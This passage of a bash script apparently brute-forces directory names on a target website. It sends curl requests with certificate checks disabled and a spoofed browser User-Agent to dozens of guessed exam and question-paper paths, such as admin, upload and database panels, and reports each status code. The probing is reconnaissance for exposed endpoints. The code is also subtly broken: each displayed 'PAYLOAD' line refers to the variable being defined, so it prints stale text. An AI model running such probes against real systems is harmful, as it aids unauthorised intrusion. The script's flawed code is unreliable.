echo -n "Payload ["QPAutoFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
